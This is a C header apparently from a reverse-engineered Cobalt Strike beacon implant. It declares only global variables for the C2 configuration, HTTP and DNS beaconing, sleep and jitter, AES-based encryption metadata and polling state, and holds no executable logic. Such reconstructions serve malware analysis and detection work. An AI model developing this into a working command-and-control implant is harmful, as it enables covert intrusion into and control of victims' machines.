#pragma once
//global variable
#include <Windows.h>
#include "tomcrypt.h"
#include "ida.h"

extern char Global_http_post_uri[3296];
extern DWORD Globala6;
extern int dword_100331A8;

extern DWORD dwMilliseconds;
extern WORD jitter;

extern HINSTANCE Dll_HINSTANCE;

//beacon_re.cpp
extern DWORD_PTR CsC2Config;
extern unsigned char rawData[4096];

//beacon_fun.cpp
extern int dword_1003B308;
extern int dword_1003AF00;
extern char Global_encryption_Metadata[0x400u];
extern int Global_encryption_Metadata_size;

extern u_long hostlong;

//polling
extern int dword_100372B0[200];
extern DWORD qword_100375E0;
extern DWORD dword_10032010;
extern DWORD qword_100375D8;
extern char* dword_10037E7C;
extern int dword_10032014;
extern int dword_10032018;
extern DWORD dword_10037E80;
extern DWORD dword_10037E84;
extern int dword_100375D4;
extern int dword_100375E8;
extern char* Global_strbuf;
extern int dword_100375D0;
extern int dword_10035EDC;
extern int dword_10036F90[200];
extern char* buff;

//function
extern int init_WSA;//判断是否初始化过
extern DWORD dns_sleep;
extern DWORD dns_idle;
extern int dns_get_A;
extern int dns_get_AAAA;
extern int dns_get_TXT;
extern int dns_Listeneroptions_dnsresolver;

extern int sha256_idx;
extern int aes_idx;
extern int aes_key_hash_ago_16[4];
extern int aes_key_hash_up_16[4];
extern symmetric_key symmetric_key_0;
extern char initialization_vector[16];
extern char Default_process_name[];
extern DWORD dwMajorVersion;
extern WORD CryptoScheme;


extern int dword_1003B308;
extern int dword_1003AF00;
extern char Global_encryption_Metadata[0x400u];
extern int Global_encryption_Metadata_size;

extern symmetric_CBC dword_10033C78;
extern CHAR* Globa_unknown_data;

